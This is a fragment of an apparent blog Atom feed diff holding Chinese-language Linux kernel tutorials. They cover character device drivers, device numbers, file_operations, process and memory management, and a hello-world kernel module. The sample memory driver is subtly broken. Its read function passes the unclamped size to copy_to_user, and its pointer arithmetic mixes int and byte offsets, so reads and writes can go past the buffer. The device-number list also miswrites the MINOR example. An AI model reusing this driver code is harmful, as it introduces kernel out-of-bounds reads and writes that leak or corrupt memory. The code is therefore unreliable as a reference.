+    <content type="html"><![CDATA[<pre><code>* 1.字符设备驱动基础* 2.简单字符设备驱动实现* 3.驱动测试</code></pre><h1 id="字符设备基础"><a href="#字符设备基础" class="headerlink" title="字符设备基础"></a>字符设备基础</h1><h2 id="字符设备描"><a href="#字符设备描" class="headerlink" title="字符设备描"></a>字符设备描</h2><p>述结构在linux2.6内核中，使用cdev结构体描述一个字符设备，其定义如下：  </p><pre><code>struct cdev {    struct kobject kobj;/*基于kobject*/    struct module *owner; /*所属模块*/    const struct file_operations *ops; /*设备文件操作函数集*/    struct list_head list;    dev_t dev; /*设备号*/    unsigned int count; /*该种类型设备数目*/};</code></pre><p>上面结构中需要我们进行初始化的有ops和dev，下面我们会对这两个成员进行分析。<br>注：kobject结构是驱动中很重要的一个结构，由于其复杂性，我们现在不进行介绍，后面会详细介绍。</p><h2 id="设备号"><a href="#设备号" class="headerlink" title="设备号"></a>设备号</h2><h3 id="何为设备号"><a href="#何为设备号" class="headerlink" title="何为设备号"></a>何为设备号</h3><p>cdev结构体中dev成员定义了设备号，而dev_t则为U32类型的也就是32位，其中12位为主设备号，20位为次设备号。我们执行ls –l /dev/可看到下图，其中左边红框为主设备号，右边为次设备号<br><img src="\images\pasted-303.png" alt="upload successful"></p><h3 id="何为主设备号"><a href="#何为主设备号" class="headerlink" title="何为主设备号"></a>何为主设备号</h3><p>用来对应该设备为何种类型设备。（比如串口我们用一个数字识别，而串口有好几个）  </p><h3 id="何为次设备号"><a href="#何为次设备号" class="headerlink" title="何为次设备号"></a>何为次设备号</h3><p>用来对应同一类型设备下的具体设备。（用次设备号来具体区分是哪个串口）</p><h3 id="设备号相关操作"><a href="#设备号相关操作" class="headerlink" title="设备号相关操作"></a>设备号相关操作</h3><ul><li>通过主设备号和次设备号获取dev：dev = MKDEV(主，次);</li><li>通过dev获取主设备号：主 = MAJOR(dev);</li><li>通过dev获取次设备号：dev = MINOR(dev);</li></ul><h3 id="设备号分配"><a href="#设备号分配" class="headerlink" title="设备号分配"></a>设备号分配</h3><p>设备号的分配有两种方式，一种是静态的，另一种是动态的，下面一一分析</p><ul><li>静态分配：也就是程序员自己指定设备号，通过register_chrdev_region();函数向内核申请，可能会导致和内核已有的冲突，从而失败。</li><li>动态分配：通过 alloc_chrdev_region(); 函数向内核申请设备号。</li><li>释放设备号：通过 unregister_chrdev_region(); 释放申请到的设备号。</li></ul><h2 id="file-operations操作函数集"><a href="#file-operations操作函数集" class="headerlink" title="file_operations操作函数集"></a>file_operations操作函数集</h2><p>file_operations结构体中的成员函数在我们驱动开发过程中极为重要，其中的内容相当庞大，下面我们看看其定义：</p><pre><code>struct file_operations {    struct module *owner;/*拥有该结构的模块的指针，一般为THIS_MODULES*/    loff_t (*llseek) (struct file *, loff_t, int); /*用来修改当前文件的读写指针*/    ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);/*从设备读取数据*/    ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);/*向设备发送数据*/    ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的读取操作*/    ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t); /*初始化一个异步的写入操作*/    int (*readdir) (struct file *, void *, filldir_t); /*只用于读取目录，对于设备文件该字段为NULL*/    unsigned int (*poll) (struct file *, struct poll_table_struct *);/*轮询函数，判断目前是否可以进行非阻塞的读取或写入*/    long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long); /* 不用BLK的文件系统，将使用此函数代替ioctl*/    long (*compat_ioctl) (struct file *, unsigned int, unsigned long); /* 代替ioctl*/    int (*mmap) (struct file *, struct vm_area_struct *);/*用于请求将设备内存映射到进程地址空间*/    int (*open) (struct inode *, struct file *);/*打开*/    int (*flush) (struct file *, fl_owner_t id); /*在进程关闭它的设备文件描述符的拷贝时调用; 它应当执行(并且等待)设备的任何未完成的操作. */    int (*release) (struct inode *, struct file *);/*关闭*/    int (*fsync) (struct file *, int datasync); /*刷新待处理数据*/    int (*aio_fsync) (struct kiocb *, int datasync); /*异步fsync*/    int (*fasync) (int, struct file *, int); /*通知设备FASYNC标志发生变化*/    int (*lock) (struct file *, int, struct file_lock *);/* 实现文件加锁*/    ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); /*通常为NULL*/    unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); /*在当前的进程地址空间找的一个未映射的内存段*/    int (*check_flags)(int); /*法允许模块检查传递给 fnctl(F_SETFL...) 调用的标志*/    int (*flock) (struct file *, int, struct file_lock *);/**/    ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); /*由VFS调用，将管道数据粘贴到文件*/    ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); /*由VFS调用，将文件数据粘贴到管道*/    int (*setlease)(struct file *, long, struct file_lock **);/**/    long (*fallocate)(struct file *file, int mode, loff_t offset,    loff_t len); /**/}</code></pre><p>上面结构体中的函数指针所指向的函数，在我们在进行open、write、read等系统调用的时候最终会被调用到，所以我们的驱动中想为应用层实现那种调用就要在此实现。</p><h2 id="字符设备驱动初始化"><a href="#字符设备驱动初始化" class="headerlink" title="字符设备驱动初始化"></a>字符设备驱动初始化</h2><p>我们通过上面的分析对设备号和操作函数集有了一定的了解下面我们来看字符设备驱动初始化，其主要步骤如下。</p><ul><li>分配cdev结构：有静态（直接定义）动态（cdev_alloc();）两种方式  </li><li>初始化cdev结构：使用 cdev_init(struct cdev <em>cdev, const struct file_operations </em>fops) 初始化  </li><li>驱动注册：使用 int cdev_add(struct cdev *p, dev_t dev, unsigned count)//count为该种类型的设备个数注册   </li><li>硬件初始化：阅读芯片手册进行硬件设备的初始化  </li><li>完成操作函数集：实现要用的操作（设备方法）  </li><li>驱动注销：使用 void cdev_del(struct cdev *p) 注销  </li></ul><h2 id="字符设备驱动模型及调用关系"><a href="#字符设备驱动模型及调用关系" class="headerlink" title="字符设备驱动模型及调用关系"></a>字符设备驱动模型及调用关系</h2><p>下面我通过一张图将字符设备的驱动结构、以及字符设备驱动与用户空间的调用关系进行展示：<br><img src="\images\pasted-304.png" alt="upload successful"></p><h2 id="遗漏知识"><a href="#遗漏知识" class="headerlink" title="遗漏知识"></a>遗漏知识</h2><p>我们内核空间和用户空间的数据交互要用到下面两个函数：  </p><ul><li>copy_from_user();//从用户空间读        </li><li>copy_to_user();//写入用户空间<br><br><br><br></li></ul><h1 id="简单字符设备驱动"><a href="#简单字符设备驱动" class="headerlink" title="简单字符设备驱动"></a>简单字符设备驱动</h1><p>实现经过上面的分析我们对字符设备有一定了解，下面我们来完成一个最简单的字符设备驱动。我只展示最主要的代码，整个项目工程在<a href="https://github.com/wrjvszq/myblongs.git欢迎大家关注。" target="_blank" rel="noopener">https://github.com/wrjvszq/myblongs.git欢迎大家关注。</a></p><h2 id="字符设备驱动编写"><a href="#字符设备驱动编写" class="headerlink" title="字符设备驱动编写"></a>字符设备驱动编写</h2><p>因为驱动本身就是一个内核模块，下面的字符设备驱动只实现了部分方法。</p><pre><code>#include&lt;linux/module.h&gt;#include&lt;linux/init.h&gt;#include&lt;linux/cdev.h&gt;#include&lt;linux/fs.h&gt;#include&lt;asm/uaccess.h&gt;#define MEM_SIZE 1024MODULE_LICENSE(&quot;GPL&quot;);struct mem_dev{    struct cdev cdev;    int mem[MEM_SIZE];//全局内存4k    dev_t devno;};struct mem_dev my_dev;/*打开设备*/int mem_open(struct inode *inode, struct file *filp){    int num = MINOR(inode-&gt;i_rdev);/*获取次设备号*/    if(num == 0){/*判断为那个设备*/        filp -&gt; private_data = my_dev.mem;/*将设备结构体指针复制给文件私有数据指针*/    }    return 0;}/*文件关闭函数*/int mem_release(struct inode *inode, struct file *filp){      return 0;}static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos){    int * pbase = filp -&gt; private_data;/*获取数据地址*/    unsigned long p = *ppos;/*读的偏移*/    unsigned int count = size;/*读数据的大小*/    int ret = 0;    if(p &gt;= MEM_SIZE)/*合法性判断*/        return 0;    if(count &gt; MEM_SIZE - p)/*读取大小修正*/        count = MEM_SIZE - p;    if(copy_to_user(buf,pbase + p,size)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    return ret;}static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos){    unsigned long p = *ppos;    unsigned int count = size;    int ret = 0;    int *pbase = filp -&gt; private_data;    if(p &gt;= MEM_SIZE)        return 0;    if(count &gt; MEM_SIZE - p)        count = MEM_SIZE - p;    if(copy_from_user(pbase + p,buf,count)){       ret = - EFAULT;    }else{        *ppos += count;        ret = count;    }    return ret;}/*seek文件定位函数*/static loff_t mem_llseek(struct file *filp, loff_t offset, int whence){    loff_t newpos;    switch(whence) {        case SEEK_SET:/*从文件头开始定位*/            newpos = offset;            break;        case SEEK_CUR:/*从当前位置开始定位*/            newpos = filp-&gt;f_pos + offset;            break;        case SEEK_END:            newpos = MEM_SIZE * sizeof(int)-1 + offset;/*从文件尾开始定位*/            break;        default:            return -EINVAL;    }     if ((newpos&lt;0) || (newpos&gt;MEM_SIZE * sizeof(int)))/*检查文件指针移动后位置是否正确*/         return -EINVAL;     filp-&gt;f_pos = newpos;     return newpos;}const struct file_operations mem_ops = {    .llseek = mem_llseek,    .open = mem_open,    .read = mem_read,    .write = mem_write,    .release = mem_release,};static int memdev_init(void){    int ret = -1;    /*动态分配设备号*/    ret = alloc_chrdev_region(&amp;my_dev.devno,0,1,&quot;memdev&quot;);    if (ret &gt;= 0){        cdev_init(&amp;my_dev.cdev,&amp;mem_ops);/*初始化字符设备*/        cdev_add(&amp;my_dev.cdev,my_dev.devno,1);/*添加字符设备*/    }    return ret;   }static void memdev_exit(void){    cdev_del(&amp;my_dev.cdev);    unregister_chrdev_region(my_dev.devno,1);}module_init(memdev_init);module_exit(memdev_exit);</code></pre><p><br><br><br></p><h1 id="驱动测试"><a href="#驱动测试" class="headerlink" title="驱动测试"></a>驱动测试</h1><p>经过上面的代码我们已经实现了一个简单的字符设备驱动，我们下面进行测试。（应用程序在<a href="https://github.com/wrjvszq/myblongs.git" target="_blank" rel="noopener">https://github.com/wrjvszq/myblongs.git</a> 上）</p><h2 id="加载内核模块"><a href="#加载内核模块" class="headerlink" title="加载内核模块"></a>加载内核模块</h2><p>我们使用 insmod memdev.ko 命令加载内核模块</p><h2 id="获取设备号"><a href="#获取设备号" class="headerlink" title="获取设备号"></a>获取设备号</h2><p>我们的设备号是动态申请到的，所以我们要通过下面的命令查看设备号<br>cat /proc/devices<br>找到我们的设备memdev的设备号<br><img src="\images\pasted-305.png" alt="upload successful"></p><h2 id="建立设备文件"><a href="#建立设备文件" class="headerlink" title="建立设备文件"></a>建立设备文件</h2><p>使用如下命令建立设备文件：<br>mknod /dev/文件名 c 主设备号次设备号<br>上面命令中文件名为我们在应用程序中打开的文件名<br>c代表字符设备主设备号为上一步找到的，我的位249<br>次设备号非负即可，但不能超过自己所创建的设备数。<br>比如我的就是 mknod /dev/memdev0 c 249 0  </p><h2 id="编译应用程序并测试"><a href="#编译应用程序并测试" class="headerlink" title="编译应用程序并测试"></a>编译应用程序并测试</h2><p>使用gcc对应用程序进行编译，然后先使用write对设备进行写入，在使用read对设备读取，完成测试。<br><br><br><br></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;* 1.字符设备驱动基础
+* 2.简单字符设备驱动实现
+* 3.驱动测试
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;字符设备基础&quot;&gt;&lt;a href=&quot;#字符设备基础&quot; class=&quot;headerlink&quot; title=&quot;字符设备基础&quot;&gt;&lt;/a&gt;字符设备基础&lt;
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux内核分析" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux内核分析（四）</title>
+    <link href="http://yoururl.com/2018/10/17/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
+    <id>http://yoururl.com/2018/10/17/Linux内核分析（四）/</id>
+    <published>2018-10-16T16:01:00.000Z</published>
+    <updated>2018-10-16T18:37:42.052Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>* 1.Linux进程管理子系统* 2.Linux网络子系统* 3.虚拟文件系统* 4.Linux设备驱动简介</code></pre><h1 id="Linux进程管理子系统"><a href="#Linux进程管理子系统" class="headerlink" title="Linux进程管理子系统"></a>Linux进程管理子系统</h1><p>在进程管理中最重要的就是进程的调度和进程的通信下面我们一一分析。</p><h2 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h2><p>进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。</p><h3 id="进程调度意义"><a href="#进程调度意义" class="headerlink" title="进程调度意义"></a>进程调度意义</h3><p>进程调度使得多个进程增长CPU中“微观串行，宏观并行”的进行执行。进程调度处于系统的中心位置，内核中其他子系统都依赖于它。</p><h3 id="进程的状态切换"><a href="#进程的状态切换" class="headerlink" title="进程的状态切换"></a>进程的状态切换</h3><p>Linux的进程在几个状态间进行切换，如下图展现了其切换关系。<br><img src="\images\pasted-300.png" alt="upload successful"></p><h3 id="进程调度策略"><a href="#进程调度策略" class="headerlink" title="进程调度策略"></a>进程调度策略</h3><p>Linux中常见的有以下：  </p><ul><li>SCHED_OTHER 分时调度策略。</li><li>SCHED_FIFO实时调度策略，先到先服务</li><li>SCHED_RR实时调度策略，时间片轮转</li></ul><h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><p>Linux支持进程间的多种通信机制，可以通过这些通信机制进行多个进程、多资源的互斥访问、进程间的同步和消息传递。  </p><h3 id="linux进程间通信方式"><a href="#linux进程间通信方式" class="headerlink" title="linux进程间通信方式"></a>linux进程间通信方式</h3><ul><li>管道：分为有名管道（用于同一系统间的任意进程）和无名管道（用于父子进程）</li><li>信号量</li><li>信号</li><li>消息队列</li><li>共享内存</li><li>套接字（socket）<br><br><br><br></li></ul><h1 id="Linux网络子系统"><a href="#Linux网络子系统" class="headerlink" title="Linux网络子系统"></a>Linux网络子系统</h1><p>Linux网络子系统提供了对各种网络标准的存取和各种硬件的支持。下图是其整体结构。其可以分为协议层和网络驱动程序，其中网络协议主要负责实现每一种可能的网络传输协议，而网络驱动程序负责与硬件通信。<br><img src="\images\pasted-301.png" alt="upload successful"><br><br><br><br></p><h1 id="Linux虚拟文件系统"><a href="#Linux虚拟文件系统" class="headerlink" title="Linux虚拟文件系统"></a>Linux虚拟文件系统</h1><p>Linux虚拟文件系统（VFS）隐藏了各种硬件的具体细节，为所有的设备提供了统一的接口，它是对各种文件系统的一个抽象，其实使用超级块super block存放文件系统相关信息，使用索引节点inode存放文件的物理信息，使用目录项dentry存放文件的逻辑信息，其整体架构如下。<br><img src="\images\pasted-302.png" alt="upload successful"><br><br><br><br></p><h1 id="Linux设备驱动简介"><a href="#Linux设备驱动简介" class="headerlink" title="Linux设备驱动简介"></a>Linux设备驱动简介</h1><p>上面的介绍很简单，仅仅是对这些子系统的概念什么的进行了简介，下面我们对linux设备驱动进行简单介绍。</p><h2 id="设备驱动分类"><a href="#设备驱动分类" class="headerlink" title="设备驱动分类"></a>设备驱动分类</h2><p>Linux分为下面三种基本设备。</p><h3 id="字符设备"><a href="#字符设备" class="headerlink" title="字符设备"></a>字符设备</h3><p>是一种<strong>按照字节</strong>来访问的设备，字符设备适用于大多数的简单硬件。常见的LED、按键等</p><h3 id="块设备"><a href="#块设备" class="headerlink" title="块设备"></a>块设备</h3><p>是一种以块（通常为512字节）为最小访问单位的设备，常见的硬盘、SD卡等。但在linux中对块没有大小限制，可以访问任意数目的字节。</p><h3 id="网络设备"><a href="#网络设备" class="headerlink" title="网络设备"></a>网络设备</h3><p>用来负责发送和接收报文的设备，比如网卡。<br><br><br><br></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;* 1.Linux进程管理子系统
+* 2.Linux网络子系统
+* 3.虚拟文件系统
+* 4.Linux设备驱动简介
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Linux进程管理子系统&quot;&gt;&lt;a href=&quot;#Linux进程管理子系统&quot; class=&quot;head
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux内核分析（三）</title>
+    <link href="http://yoururl.com/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89/"/>
+    <id>http://yoururl.com/2018/10/16/Linux内核分析（三）/</id>
+    <published>2018-10-16T15:44:00.000Z</published>
+    <updated>2018-10-16T16:03:46.490Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>* Linux地址映射* Linux内存分配</code></pre><p>在分析今天的内容之前，我们先看一位大神做的内存管理图。其实这张图可以分为两个部分，一部分是地址映射，另一部分就是内存分配。<br><img src="\images\pasted-297.png" alt="upload successful"></p><h1 id="Linux地址映射"><a href="#Linux地址映射" class="headerlink" title="Linux地址映射"></a>Linux地址映射</h1><p>下面的分析我们依据上图进行分析，首先我们来看其最右边的地址分布图（当然这是虚拟空间）。其地址分布总的可以分为两个部分我们下面慢慢分析（基于32位处理器）。<br><img src="\images\pasted-298.png" alt="upload successful"></p><h2 id="用户空间（0-3G）"><a href="#用户空间（0-3G）" class="headerlink" title="用户空间（0~3G）"></a>用户空间（0~3G）</h2><p>空间简介其从0x00000000到0xBFFFFFFF共3GB的线性地址空间，每个进程都有一个独立的3GB用户空间，当然这是虚拟的空间。<br>如何转换为物理空间这一部分虚拟空间到物理空间的转换方法是我们以前在<a href="http://www.cnblogs.com/wrjvszq/p/4246634.html一文中分析过的MMU地址转换。" target="_blank" rel="noopener">http://www.cnblogs.com/wrjvszq/p/4246634.html一文中分析过的MMU地址转换。</a></p><h2 id="内核空间（3-4G）"><a href="#内核空间（3-4G）" class="headerlink" title="内核空间（3~4G）"></a>内核空间（3~4G）</h2><p>其从0xC0000000到0xFFFFFFFF共1GB大小，内核空间又可以根据映射方式的不同分为下面四块，我们一一分析  </p><h3 id="内核逻辑地址空间"><a href="#内核逻辑地址空间" class="headerlink" title="内核逻辑地址空间"></a>内核逻辑地址空间</h3><p><strong>空间简介</strong><br>其从0xC0000000到high_memory(图中896MB的地方)最大为896MB（也就是说这块空间有可能不满，但最大为896MB），当然是虚拟空间。<br>注：在此注意一下896MB我们一会在分析。<br><strong>如何转换为物理空间</strong><br>这一部分虚拟地址与物理内存中对应的地址只差一个固定偏移量（3G），如果内存物理地址空间从0x00000000地址编址，那么这个固定偏移量就是PAGE_OFFSET（如上图）。  </p><h3 id="Vmalloc空间"><a href="#Vmalloc空间" class="headerlink" title="Vmalloc空间"></a>Vmalloc空间</h3><p><strong>空间简介</strong><br>其地址没有严格的界限，这段空间既可以访问到我们的高端内存，也可以访问到低端内存。<br><strong>如何转换为物理空间</strong><br>不是通过简单的线性关系映射，在此不研究。  </p><h3 id="永久内核映射"><a href="#永久内核映射" class="headerlink" title="永久内核映射"></a>永久内核映射</h3><p><strong>空间简介</strong><br>其固定用来访问高端内存。<br><strong>如何转换为物理空间</strong><br>不是通过简单的线性关系映射，在此不研究。</p><h3 id="固定映射"><a href="#固定映射" class="headerlink" title="固定映射"></a>固定映射</h3><p><strong>空间简介</strong><br>其在系统初始化期间永久映射I/O地址空间，或者特殊的寄存器。</p><h2 id="遗留知识"><a href="#遗留知识" class="headerlink" title="遗留知识"></a>遗留知识</h2><p>在刚才我们前面的分析中我们留下了一些问题下面进行解释。  </p><h3 id="低端内存"><a href="#低端内存" class="headerlink" title="低端内存"></a>低端内存</h3><p>内核逻辑地址空间所映射的物理内存就是低端内存(实际物理内存的大小，但是小于896MB)</p><h3 id="高端内存"><a href="#高端内存" class="headerlink" title="高端内存"></a>高端内存</h3><p>低端内存地址之上的物理内存是高端内存（物理内存896MB之上）。</p><h3 id="896MB来由"><a href="#896MB来由" class="headerlink" title="896MB来由"></a>896MB来由</h3><p>Linux将内存分为内核空间和用户空间，其中内核空间中的0xC0000000~high_memory部分用来映射物理内存，但是我们还需要映射I/O空间和固定的寄存器，所以留出了high_memory~0xFFFFFFFF之间的地址来映射I/O空间和固定的寄存器，而在X86平台根据经验设定了这个high_memory为896MB。  </p><h1 id="Linux内存分配"><a href="#Linux内存分配" class="headerlink" title="Linux内存分配"></a>Linux内存分配</h1><p>通过上面的介绍我们对linux对内存的管理，以及地址的映射有了一个了解，下面我们来分析linux是如何进行内存分配的。<br><img src="\images\pasted-299.png" alt="upload successful"><br>通过上图我们可以分析出内存的分配过程：  </p><ul><li>由malloc、fork等系统调用和kmalloc、vmalloc申请得到虚拟内存。  </li><li>在我们使用该内存的时候，产生请页异常（kmalloc除外）  </li><li>从空闲的页框分配物理内存，和虚拟地址建立映射。  </li></ul><p>注：kmalloc申请空间是不用经过请页异常的，返回的虚拟地址已经对应了物理内存。Kmalloc可以分配到连续的物理内存，vmalloc分配的是非连续的物理内存。<br><br><br><br></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;* Linux地址映射
+* Linux内存分配
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在分析今天的内容之前，我们先看一位大神做的内存管理图。其实这张图可以分为两个部分，一部分是地址映射，另一部分就是内存分配。&lt;br&gt;&lt;img src=&quot;\images\pasted
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux内核分析（二）</title>
+    <link href="http://yoururl.com/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+    <id>http://yoururl.com/2018/10/16/Linux内核分析（二）/</id>
+    <published>2018-10-16T15:41:00.000Z</published>
+    <updated>2018-10-16T16:12:43.478Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>* 1.Linux内核模块简介* 2.简单内核模块实现</code></pre><h1 id="Linux内核模块简介"><a href="#Linux内核模块简介" class="headerlink" title="Linux内核模块简介"></a>Linux内核模块简介</h1><h2 id="何为内核模块"><a href="#何为内核模块" class="headerlink" title="何为内核模块"></a>何为内核模块</h2><p>在上一篇博文中我们先通过内核配置，在配置的过程中我们对内核的组件进行了选择（当然这个选择决定了我们内核的大小），然后才生成了我们最终的内核，那么我们如果想添加组件，怎么办？<br>最笨的方法是对内核进行重新配置，然后在重新编译。这样的话岂不是说我加一个组件就得重新编译内核，这显然不是很科学的方法，其实我们的linux内核提供在运行时可进行扩展的特性，这意味着当系统启动并运行时，我们可以向内核添加或移除部分功能。<br>我们在运行时添加到内核中的代码就被成为动态可加载内核模块，我们简称为内核模块。  </p><h2 id="内核模块的相关操作"><a href="#内核模块的相关操作" class="headerlink" title="内核模块的相关操作"></a>内核模块的相关操作</h2><p>加载内核模块：insmod<br>卸载内核模块：rmmod<br>查看内核模块：lsmod  </p><h2 id="模块声明"><a href="#模块声明" class="headerlink" title="模块声明"></a>模块声明</h2><p>MODULE_LICENSE（“GPL”）：内核可以识别的许可证有GPL（任意版本GNU通用公共许可证）、GPL v2等<br>MODULE_AUTHOR（“作者”）：声明作者信息可以不用<br>MODULE_VERSION（“版本”）：声明版本信息也可以不用<br>MODULE_DESCRIPTION（“功能描述”）：声明模块功能，可不用  </p><h2 id="模块参数"><a href="#模块参数" class="headerlink" title="模块参数"></a>模块参数</h2><p>我们可以在加载内核模块的时候向其传递参数，以让同一代码达到不同的效果。当然我们的参数必须用module_param宏来声明具体如下：<br>module_param（name，type，perm）<br>name：变量名<br>type：数据类型内核支持模块参数类型有：bool、invbool（bool的发转，true变为false，false变为true）、charp（char类型指针值）、int、long、short、uint、ulong、ushort<br>perm：常见的访问许可值通常为S_IRUGO和S_IWUSR。通常情况下将他们按位或同时我们也可以用下面的宏声明数组：<br>        Module_param_array（name，type，num，perm） </p><h2 id="模块符号导出"><a href="#模块符号导出" class="headerlink" title="模块符号导出"></a>模块符号导出</h2><p>当一个模块要使用另一个模块的函数（变量）的时候，要使用EXPORT_SYMBOL（符号名）或者EXPORT_SYMBOL_GPL（符号名）来申明。<br>注：EXPORT_SYMBOL_GPL（）只适用于遵循GPL协议的模块  </p><h1 id="简单内核模块实现"><a href="#简单内核模块实现" class="headerlink" title="简单内核模块实现"></a>简单内核模块实现</h1><p>想必大家都记得我们在学习某种语言的时候，写的第一个程序大部分都是输出hello world，所以我接下来用我们刚才介绍的内核模块去完成hello world。</p><h2 id="内核模块编写"><a href="#内核模块编写" class="headerlink" title="内核模块编写"></a>内核模块编写</h2><p>通过上面部分内容的介绍，要完成第一内核模块不是很难，下面是自己的代码。</p><pre><code>#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;MODULE_LICENSE(&quot;GPL&quot;);staticint hello_init(void){    printk(&quot;&lt;0&gt; hello world\n&quot;);    return0;}staticvoid hello_exit(void){    printk(&quot;&lt;0&gt; goodbye\n&quot;);}module_init(hello_init);//该宏在模块的目标代码中增加一个特殊的段，用于说明内核初始化函数所在的位置module_exit(hello_exit);//跟上面的宏对立</code></pre><h2 id="Makefile编写"><a href="#Makefile编写" class="headerlink" title="Makefile编写"></a>Makefile编写</h2><p>Makefile的编写也比较简单，要注意的地方代码中已经说明。</p><pre><code>obj-m := hello.oDIRS :=/smbshare/linux-2.6.39///此处路径为内核源码路径，该内核源码必须要经过编译，不然会报错all:make -C $(DIRS) M=$(PWD) modulesclean:rm -Rf*.o *.ko *.mod.c *.order *.symvers    </code></pre><p>经过了上面两个步骤，我们然后编译加载然后卸载我们的模块进行试验。<br>编译：<img src="\images\pasted-292.png" alt="upload successful"><br>加载：<img src="\images\pasted-293.png" alt="upload successful"><br>查看：<img src="\images\pasted-294.png" alt="upload successful"><br>卸载：<img src="\images\pasted-295.png" alt="upload successful"></p><h2 id="Printk函数简介"><a href="#Printk函数简介" class="headerlink" title="Printk函数简介"></a>Printk函数简介</h2><p>printk函数为内核打印函数，其和printf函数功能类似，不过比printf多了打印权限一共有8个级别，printk的日志级别定义如下（在include/linux/kernel.h中）：  </p><pre><code>#define KERN_EMERG    0 //紧急事件消息，系统崩溃之前提示，表示系统不可用#define KERN_ALERT    1 //报告消息，表示必须立即采取措施#define KERN_CRIT     2 //临界条件，通常涉及严重的硬件或软件操作失败#define KERN_ERR      3 //错误条件，驱动程序常用KERN_ERR来报告硬件的错误#define KERN_WARNING  4 //警告条件，对可能出现问题的情况进行警告#define KERN_NOTICE   5 //正常但又重要的条件，用于提醒#define KERN_INFO     6 //提示信息，如驱动程序启动时，打印硬件信息#define KERN_DEBUG    7 //调试级别的消息</code></pre><p>给大家推荐一个比较好用的工具，叫做exvim其将好多vim的工具进行了集成，个人感觉十分方便，就是换电脑什么的也不怕自己的配置丢失了。大家有兴趣的可以去<a href="http://exvim.github.io/" target="_blank" rel="noopener">http://exvim.github.io/</a> 了解。<br><img src="\images\pasted-296.png" alt="upload successful"><br><br><br><br></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;* 1.Linux内核模块简介
+* 2.简单内核模块实现
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Linux内核模块简介&quot;&gt;&lt;a href=&quot;#Linux内核模块简介&quot; class=&quot;headerlink&quot; title=&quot;Linux内核模块简介&quot;&gt;&lt;/a&gt;
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux内核分析（一）</title>
+    <link href="http://yoururl.com/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    <id>http://yoururl.com/2018/10/16/Linux内核分析/</id>
+    <published>2018-10-16T13:23:00.000Z</published>
+    <updated>2018-10-16T16:08:42.874Z</updated>
+    
